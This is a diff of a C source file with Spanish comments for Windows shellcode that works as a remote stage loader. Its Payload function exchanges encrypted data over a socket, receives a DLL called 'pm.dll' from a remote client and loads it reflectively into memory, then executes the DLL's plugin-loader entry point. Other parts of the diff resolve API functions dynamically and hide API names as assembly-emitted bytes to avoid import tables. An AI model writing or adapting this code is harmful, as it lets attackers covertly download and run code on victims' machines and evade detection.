@@ -3,13 +3,19 @@
 #include <stdio.h>
 #include "main.h"
 
+void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY);
+void Start(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY);
+void Payload(PSHELLCODE_CONTEXT scc);
+
 void __declspec(naked) Start(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY){
     __asm{
         jmp scInit
     }
 }
 
-void *MyRealloc(SHELLCODE_CONTEXT *pSCC, void *ptr, size_t size){
+#pragma region LibThings
+
+void *MyRealloc(PSHELLCODE_CONTEXT pSCC, void *ptr, size_t size){
     //Funcion para relocalizar o localizar el array de modules
 	if (NULL == ptr)
 		return pSCC->RtlAllocateHeap_(pSCC->GetProcessHeap_(), 0, size);
@@ -17,7 +23,7 @@ void *MyRealloc(SHELLCODE_CONTEXT *pSCC, void *ptr, size_t size){
 		return pSCC->RtlReAllocateHeap_(pSCC->GetProcessHeap_(), 0, ptr, size);
 }
 
-void CopySections(SHELLCODE_CONTEXT *pSCC, const unsigned char *data, PIMAGE_NT_HEADERS old_headers, PMEMORYMODULE module){
+void CopySections(PSHELLCODE_CONTEXT pSCC, const unsigned char *data, PIMAGE_NT_HEADERS old_headers, PMEMORYMODULE module){
 	int i, size;
 	unsigned char *codeBase = module->codeBase;
 	unsigned char *dest;
@@ -48,7 +54,7 @@ void CopySections(SHELLCODE_CONTEXT *pSCC, const unsigned char *data, PIMAGE_NT_
 }
 
 //Protegemos las paginas de memoria segun corresponda
-void FinalizeSections(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module){
+void FinalizeSections(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
 	int i;
 	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module->headers);
 	int ProtectionFlags[2][2][2] = {
@@ -139,7 +145,7 @@ void PerformBaseRelocation(PMEMORYMODULE module, DWORD delta){
 }
 
 //Rellenamos la IAT
-BOOL BuildImportTable(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module){
+BOOL BuildImportTable(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
 	unsigned char *codeBase = module->codeBase;
 
     //Comprobamos que haya import
@@ -197,7 +203,7 @@ BOOL BuildImportTable(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module){
 	return true;
 }
 
-void NotifyTls(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module, BOOL State){
+void NotifyTls(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module, bool State){
     PIMAGE_DATA_DIRECTORY tls_dd    = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_TLS);
     DWORD tls_index;
     PBYTE buffer;
@@ -236,12 +242,12 @@ void NotifyTls(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module, BOOL State){
     }
 }
 
-void AddToModules(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module, LPCWSTR name){
+void AddToModules(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module, LPCWSTR name){
     //Creamos la estructura
     module->ldr_mod = (PLDR_MODULE)pSCC->malloc__(sizeof(LDR_MODULE));
 
     //Asignamos valores generales
-    module->ldr_mod->TlsIndex  = pSCC->TlsAlloc_();
+    module->ldr_mod->TlsIndex  = (WORD)pSCC->TlsAlloc_();
     module->ldr_mod->DllBase = module->codeBase;
     module->ldr_mod->SizeOfImage = module->headers->OptionalHeader.SizeOfImage;
     module->ldr_mod->EntryPoint = (PVOID)(module->codeBase + module->headers->OptionalHeader.AddressOfEntryPoint);
@@ -251,7 +257,7 @@ void AddToModules(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module, LPCWSTR name){
     module->ldr_mod->TimeDateStamp = module->headers->FileHeader.TimeDateStamp;
     module->ldr_mod->Flags = LDR_WINE_INTERNAL | LDR_ENTRY_PROCESSED | LDR_LOAD_IN_PROGRESS;
 
-    DWORD name_size = 0;
+    USHORT name_size = 0;
     //Calculamos el tamaño del nombre
     while(name[++name_size]!=0){}
 
@@ -284,8 +290,7 @@ void AddToModules(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module, LPCWSTR name){
     module->ldr_mod->InLoadOrderLinks.Flink = last;
 }
 
-PMEMORYMODULE LoadLibraryFromMemory(SHELLCODE_CONTEXT *pSCC, const void *data, LPCWSTR dllname){
-	PMEMORYMODULE       result;
+int LoadLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, const void *data, LPCWSTR dllname, PMEMORYMODULE result){
 	PIMAGE_DOS_HEADER   dos_header;
 	PIMAGE_NT_HEADERS   old_header;
 	unsigned char       *code;
@@ -308,14 +313,10 @@ PMEMORYMODULE LoadLibraryFromMemory(SHELLCODE_CONTEXT *pSCC, const void *data, L
         //...salimos
 		return NULL;
 
-    //Reservamos nuestro array
-	result = (PMEMORYMODULE)pSCC->RtlAllocateHeap_(pSCC->GetProcessHeap_(), 0, sizeof(MEMORYMODULE));
-
     //Asignamos parte de informacion a nuestra estructura
 	result->codeBase = code;
 	result->numModules = 0;
 	result->modules = NULL;
-	result->initialized = 0;
 
 	//Hacemos commit de la memoria
 	pSCC->VirtualAlloc_(code, old_header->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
@@ -364,10 +365,10 @@ PMEMORYMODULE LoadLibraryFromMemory(SHELLCODE_CONTEXT *pSCC, const void *data, L
 			return NULL;
 	}
 
-	return (PMEMORYMODULE)result;
+	return 1;
 }
 
-void FreeLibraryFromMemory(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module){
+void FreeLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
     //Notificamos que vamos a descargar la libreria
     if (module->headers->OptionalHeader.AddressOfEntryPoint != 0){
         DllEntryProc DllEntry = (DllEntryProc)(module->codeBase + module->headers->OptionalHeader.AddressOfEntryPoint);
@@ -393,423 +394,102 @@ void FreeLibraryFromMemory(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module){
     for(int i=0; i<module->numModules;i++){
         pSCC->FreeLibrary_(module->modules[i]);
     }
+
+    //Liberamos el array de modules
+    pSCC->RtlFreeHeap_(pSCC->GetProcessHeap_, 0, module->modules);
 }
 
+#pragma endregion
 
-void Payload(SHELLCODE_CONTEXT *scc){
-    //Enviamos el OK al cliente.
-    char ok[16]     = {0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0};
+void Payload(PSHELLCODE_CONTEXT scc){
+    bool  bReceived = true;
+    char* bBuff     = 0;
+    DWORD dwSize    = 0;
     DWORD dwDSize   = 15;
+    //Generamos el OK
+    char ok[16]     = {0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0};
     scc->CryptEncrypt_(scc->hKey, 0, true, 0, (BYTE*)ok, &dwDSize, sizeof(ok));
 
-    scc->send_(scc->hSocket, ok, sizeof(ok), 0);
+    //Enviamos el OK al cliente.
+    if (scc->send_(scc->hSocket, ok, sizeof(ok), 0) == sizeof(ok)){
+        //Recibimos el tamaño del PluginManager
+        if ((scc->recv_(scc->hSocket, (char*)&dwSize, sizeof(DWORD), 0) == 4)&&(dwSize > 0)){   //Si lo que hemos recibido es un DWORD y nos han aceptado el OK...
+            //Hacemos sitio para almacenar el PluginManager
+            bBuff = (char*)scc->malloc__(dwSize);
+            if (bBuff > 0){
+                DWORD dwASize   = dwSize;
+                DWORD lResult   = 0;
 
-    //Recibimos el tamaño del PluginManager
-    DWORD dwSize    = 0;
-    if ((scc->recv_(scc->hSocket, (char*)&dwSize, sizeof(DWORD), 0) == 4)&&(dwSize > 0)){   //Si lo que hemos recibido es un DWORD y nos han aceptado el OK...
-        //Hacemos sitio para almacenar el PluginManager
-        char* bBuff = (char*)scc->malloc__(dwSize);
-        if (bBuff > 0){
-            DWORD dwASize   = dwSize;
-            DWORD lResult   = 0;
-            bool  bReceived = true;
-
-            //Recibimos el PluginManager
-            while ((dwASize > 0) && (bReceived==true)){
-                lResult = scc->recv_(scc->hSocket, (char*)(bBuff+(dwSize-dwASize)), dwASize, 0);
-                dwASize -= lResult;
-                if(lResult <= 0)
-                    bReceived = false;
-            }
-            dwDSize = dwSize;
-
-            //Lo desciframos
-            if ((bReceived==true)&&(scc->CryptDecrypt_(scc->hKey, 0, true, 0, (BYTE*)bBuff, &dwDSize) == 1)){
-                //Procedemos a comprobar el Checksum
-                DWORD oChecksum = *(DWORD*)bBuff;
-                //Saltamos el Checksum de los datos recibidos
-                bBuff += 4;
-                DWORD nChecksum = 0;
-
-                for(DWORD i = 0; i < dwSize-4;i++){
-                    nChecksum ^= (BYTE)bBuff[i];
-                    nChecksum *= 0x1EF30EB;
-                };
-
-                //Si el checksum coincide
-                if (nChecksum == oChecksum){
-                    //Cargamos y ejecutamos el PluginManager
-                    WCHAR sDLLName[]    = {'p', 'm', '.', 'd', 'l', 'l', '\0'};
-                    char sPMEntry[]     = {'I', 'n', 'i', 't', 'P', 'l', 'u', 'g', 'i', 'n', 'L', 'o', 'a', 'd','e', 'r', '@', '1', '2', '\0'};
-                    
-                    PMEMORYMODULE PM_Mod;
-                    //Si hemos podido cargar el PM...
-                    if ((PM_Mod = LoadLibraryFromMemory(scc, bBuff, sDLLName))){
-                        //Creamos la estructura que recibe
-                        typedef int (WINAPI *InitPluginLoader)(SOCKET hConexion, HCRYPTKEY hKey, LoaderFunTable& lFunc);
-                        InitPluginLoader MainFunc = (InitPluginLoader)scc->GetProcAddressA_((HMODULE)PM_Mod->codeBase, sPMEntry);
-                        if (MainFunc){
-                            LoaderFunTable LFT;
-                            LFT.FLFM                    = (FreeLibraryFromMemory_)((PBYTE)FreeLibraryFromMemory);
-                            LFT.LLFM                    = (LoadLibraryFromMemory_)((PBYTE)LoadLibraryFromMemory);
-                            LFT.GetProcAddress          = (unsigned long**)scc->GetProcAddressA_;
-                            LFT.LoadLibraryA            = (unsigned long**)scc->LoadLibraryA_;
-                            //y ejecutamos el Main
-                            MainFunc(scc->hSocket, scc->hKey, LFT);
-                        }
-                        //Si el PM nos retorna la ejecución descargamos la DLL de memoria
-                        FreeLibraryFromMemory(scc, PM_Mod);
-                        //y eliminamos el buffer
-                        scc->free_(bBuff - 4);
-                    }
+                //Recibimos el PluginManager
+                while ((dwASize > 0) && (bReceived==true)){
+                    lResult = scc->recv_(scc->hSocket, (char*)(bBuff+(dwSize-dwASize)), dwASize, 0);
+                    dwASize -= lResult;
+                    if(lResult <= 0)
+                        bReceived = false;
                 }
+                dwDSize = dwSize;
             }
         }
+    }else{
+        DWORD last_err = ERROR_SUCCESS;
+        __asm{
+            xor eax, eax                    //EAX = 0
+            mov eax, DWORD PTR FS:[eax+0x18]//vEAX = &TEB
+            mov eax, [eax+0x34]             //v
+            mov [last_err], eax             //> last_err = GetLastError()
+        }
+        if (last_err == WSAENOTCONN){
+            MessageBoxA(0,0,0,0);
+        }else{
+            return;
+        }
     }
+
+    //Lo desciframos
+    if ((bReceived==true)&&(scc->CryptDecrypt_(scc->hKey, 0, true, 0, (BYTE*)bBuff, &dwDSize) == 1)){
+        //Procedemos a comprobar el Checksum
+        DWORD oChecksum = *(DWORD*)bBuff;
+        //Saltamos el Checksum de los datos recibidos
+        bBuff += 4;
+        DWORD nChecksum = 0;
+
+        for(DWORD i = 0; i < dwSize-4;i++){
+            nChecksum ^= (BYTE)bBuff[i];
+            nChecksum *= 0x1EF30EB;
+        };
+
+        //Si el checksum coincide
+        if (nChecksum == oChecksum){
+            //Cargamos y ejecutamos el PluginManager
+            WCHAR sDLLName[]    = {'p', 'm', '.', 'd', 'l', 'l', '\0'};
+            char sPMEntry[]     = {'I', 'n', 'i', 't', 'P', 'l', 'u', 'g', 'i', 'n', 'L', 'o', 'a', 'd','e', 'r', '@', '1', '2', '\0'};
+
+            PMEMORYMODULE PM_Mod = (PMEMORYMODULE)scc->RtlAllocateHeap_(scc->GetProcessHeap_(), 0, sizeof(MEMORYMODULE));;
+            //Si hemos podido cargar el PM...
+            if ((LoadLibraryFromMemory(scc, bBuff, sDLLName, PM_Mod))){
+                InitPluginLoader MainFunc = (InitPluginLoader)scc->GetProcAddressA_((HMODULE)PM_Mod->codeBase, sPMEntry);
+                if (MainFunc){
+                    scc->FLFM   = /*(FreeLibraryFromMemory_)*/((PBYTE)FreeLibraryFromMemory);
+                    scc->LLFM   = /*(LoadLibraryFromMemory_)*/((PBYTE)LoadLibraryFromMemory);
+                    //y ejecutamos el Main
+                    MainFunc(scc);
+                }
+                //Si el PM nos retorna la ejecución descargamos la DLL de memoria
+                FreeLibraryFromMemory(scc, PM_Mod);
+                //y la estructura
+                scc->RtlFreeHeap_(scc->GetProcessHeap_(), 0, PM_Mod);
+            }
+        }
+        bBuff-= 4;
+    }
+    //eliminamos el buffer
+    scc->free_(bBuff);
     return;
 }
 
 void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY){
-    LPCSTR              Strings;
-
-#pragma region cadenas
-    __asm{
-        call over_strings
-#define sNTDLL (LPCSTR)((PBYTE)Strings + 0)
-		__emit 'N'
-		__emit 'T'
-		__emit 'D'
-		__emit 'L'
-		__emit 'L'
-		__emit 0
-
-
-#define smemset (LPCSTR)((PBYTE)Strings + 6)
-		__emit 'm'
-		__emit 'e'
-		__emit 'm'
-		__emit 's'
-		__emit 'e'
-		__emit 't'
-		__emit 0
-
-
-#define smemcpy (LPCSTR)((PBYTE)Strings + 13)
-		__emit 'm'
-		__emit 'e'
-		__emit 'm'
-		__emit 'c'
-		__emit 'p'
-		__emit 'y'
-		__emit 0
-
-
-#define sRtlAllocateHeap (LPCSTR)((PBYTE)Strings + 20)
-		__emit 'R'
-		__emit 't'
-		__emit 'l'
-		__emit 'A'
-		__emit 'l'
-		__emit 'l'
-		__emit 'o'
-		__emit 'c'
-		__emit 'a'
-		__emit 't'
-		__emit 'e'
-		__emit 'H'
-		__emit 'e'
-		__emit 'a'
-		__emit 'p'
-		__emit 0
-
-
-#define sRtlReAllocateHeap (LPCSTR)((PBYTE)Strings + 36)
-		__emit 'R'
-		__emit 't'
-		__emit 'l'
-		__emit 'R'
-		__emit 'e'
-		__emit 'A'
-		__emit 'l'
-		__emit 'l'
-		__emit 'o'
-		__emit 'c'
-		__emit 'a'
-		__emit 't'
-		__emit 'e'
-		__emit 'H'
-		__emit 'e'
-		__emit 'a'
-		__emit 'p'
-		__emit 0
-
-
-#define sKERNEL32 (LPCSTR)((PBYTE)Strings + 54)
-		__emit 'K'
-		__emit 'E'
-		__emit 'R'
-		__emit 'N'
-		__emit 'E'
-		__emit 'L'
-		__emit '3'
-		__emit '2'
-		__emit 0
-
-
-#define sFreeLibrary (LPCSTR)((PBYTE)Strings + 63)
-		__emit 'F'
-		__emit 'r'
-		__emit 'e'
-		__emit 'e'
-		__emit 'L'
-		__emit 'i'
-		__emit 'b'
-		__emit 'r'
-		__emit 'a'
-		__emit 'r'
-		__emit 'y'
-		__emit 0
-
-
-#define sTlsAlloc (LPCSTR)((PBYTE)Strings + 75)
-		__emit 'T'
-		__emit 'l'
-		__emit 's'
-		__emit 'A'
-		__emit 'l'
-		__emit 'l'
-		__emit 'o'
-		__emit 'c'
-		__emit 0
-
-
-#define sTlsFree (LPCSTR)((PBYTE)Strings + 84)
-		__emit 'T'
-		__emit 'l'
-		__emit 's'
-		__emit 'F'
-		__emit 'r'
-		__emit 'e'
-		__emit 'e'
-		__emit 0
-
-
-#define sTlsSetValue (LPCSTR)((PBYTE)Strings + 92)
-		__emit 'T'
-		__emit 'l'
-		__emit 's'
-		__emit 'S'
-		__emit 'e'
-		__emit 't'
-		__emit 'V'
-		__emit 'a'
-		__emit 'l'
-		__emit 'u'
-		__emit 'e'
-		__emit 0
-
-
-#define sTlsGetValue (LPCSTR)((PBYTE)Strings + 104)
-		__emit 'T'
-		__emit 'l'
-		__emit 's'
-		__emit 'G'
-		__emit 'e'
-		__emit 't'
-		__emit 'V'
-		__emit 'a'
-		__emit 'l'
-		__emit 'u'
-		__emit 'e'
-		__emit 0
-
-
-#define sVirtualAlloc (LPCSTR)((PBYTE)Strings + 116)
-		__emit 'V'
-		__emit 'i'
-		__emit 'r'
-		__emit 't'
-		__emit 'u'
-		__emit 'a'
-		__emit 'l'
-		__emit 'A'
-		__emit 'l'
-		__emit 'l'
-		__emit 'o'
-		__emit 'c'
-		__emit 0
-
-
-#define sVirtualFree (LPCSTR)((PBYTE)Strings + 129)
-		__emit 'V'
-		__emit 'i'
-		__emit 'r'
-		__emit 't'
-		__emit 'u'
-		__emit 'a'
-		__emit 'l'
-		__emit 'F'
-		__emit 'r'
-		__emit 'e'
-		__emit 'e'
-		__emit 0
-
-
-#define sVirtualProtect (LPCSTR)((PBYTE)Strings + 141)
-		__emit 'V'
-		__emit 'i'
-		__emit 'r'
-		__emit 't'
-		__emit 'u'
-		__emit 'a'
-		__emit 'l'
-		__emit 'P'
-		__emit 'r'
-		__emit 'o'
-		__emit 't'
-		__emit 'e'
-		__emit 'c'
-		__emit 't'
-		__emit 0
-
-
-#define sGetProcessHeap (LPCSTR)((PBYTE)Strings + 156)
-		__emit 'G'
-		__emit 'e'
-		__emit 't'
-		__emit 'P'
-		__emit 'r'
-		__emit 'o'
-		__emit 'c'
-		__emit 'e'
-		__emit 's'
-		__emit 's'
-		__emit 'H'
-		__emit 'e'
-		__emit 'a'
-		__emit 'p'
-		__emit 0
-
-
-#define sIsBadReadPtr (LPCSTR)((PBYTE)Strings + 171)
-		__emit 'I'
-		__emit 's'
-		__emit 'B'
-		__emit 'a'
-		__emit 'd'
-		__emit 'R'
-		__emit 'e'
-		__emit 'a'
-		__emit 'd'
-		__emit 'P'
-		__emit 't'
-		__emit 'r'
-		__emit 0
-
-
-#define sWS2_32 (LPCSTR)((PBYTE)Strings + 184)
-		__emit 'W'
-		__emit 'S'
-		__emit '2'
-		__emit '_'
-		__emit '3'
-		__emit '2'
-		__emit 0
-
-
-#define ssend (LPCSTR)((PBYTE)Strings + 191)
-		__emit 's'
-		__emit 'e'
-		__emit 'n'
-		__emit 'd'
-		__emit 0
-
-
-#define srecv (LPCSTR)((PBYTE)Strings + 196)
-		__emit 'r'
-		__emit 'e'
-		__emit 'c'
-		__emit 'v'
-		__emit 0
-
-
-#define sADVAPI32 (LPCSTR)((PBYTE)Strings + 201)
-		__emit 'A'
-		__emit 'D'
-		__emit 'V'
-		__emit 'A'
-		__emit 'P'
-		__emit 'I'
-		__emit '3'
-		__emit '2'
-		__emit 0
-
-
-#define sCryptDecrypt (LPCSTR)((PBYTE)Strings + 210)
-		__emit 'C'
-		__emit 'r'
-		__emit 'y'
-		__emit 'p'
-		__emit 't'
-		__emit 'D'
-		__emit 'e'
-		__emit 'c'
-		__emit 'r'
-		__emit 'y'
-		__emit 'p'
-		__emit 't'
-		__emit 0
-
-
-#define sCryptEncrypt (LPCSTR)((PBYTE)Strings + 223)
-		__emit 'C'
-		__emit 'r'
-		__emit 'y'
-		__emit 'p'
-		__emit 't'
-		__emit 'E'
-		__emit 'n'
-		__emit 'c'
-		__emit 'r'
-		__emit 'y'
-		__emit 'p'
-		__emit 't'
-		__emit 0
-
-
-#define sMSVCRT (LPCSTR)((PBYTE)Strings + 236)
-		__emit 'M'
-		__emit 'S'
-		__emit 'V'
-		__emit 'C'
-		__emit 'R'
-		__emit 'T'
-		__emit 0
-
-
-#define smalloc (LPCSTR)((PBYTE)Strings + 243)
-		__emit 'm'
-		__emit 'a'
-		__emit 'l'
-		__emit 'l'
-		__emit 'o'
-		__emit 'c'
-		__emit 0
-
-
-#define sfree (LPCSTR)((PBYTE)Strings + 250)
-		__emit 'f'
-		__emit 'r'
-		__emit 'e'
-		__emit 'e'
-		__emit 0
-over_strings:
-        pop  eax
-        mov  [Strings], eax
-    }
-#pragma endregion
-
-    SHELLCODE_CONTEXT*  scc = (SHELLCODE_CONTEXT*)((_malloc)pGPA(pLoadLibA(sMSVCRT), smalloc))(sizeof(SHELLCODE_CONTEXT));
+    #include "cadenas.h"
+    PSHELLCODE_CONTEXT  scc = (SHELLCODE_CONTEXT*)((_malloc)pGPA(pLoadLibA(sMSVCRT), smalloc))(sizeof(SHELLCODE_CONTEXT));
 
     scc->NTDLL              = pLoadLibA(sNTDLL);
     scc->memcpy_            = (_memcpy)pGPA(scc->NTDLL, smemcpy);
@@ -832,7 +512,6 @@ over_strings:
     scc->WS2_32             = pLoadLibA(sWS2_32);
     scc->send_              = (_send)pGPA(scc->WS2_32, ssend);
     scc->recv_              = (_recv)pGPA(scc->WS2_32, srecv);
-
     scc->ADVAPI32           = pLoadLibA(sADVAPI32);
     scc->CryptDecrypt_      = (_CryptDecrypt)pGPA(scc->ADVAPI32, sCryptDecrypt);
     scc->CryptEncrypt_      = (_CryptEncrypt)pGPA(scc->ADVAPI32, sCryptEncrypt);
@@ -855,7 +534,6 @@ over_strings:
     }
     return;
 }
-
 
 //Código utilizado para generar ".bin" y debuggear la shellcode
 int main(int argc, char **argv){
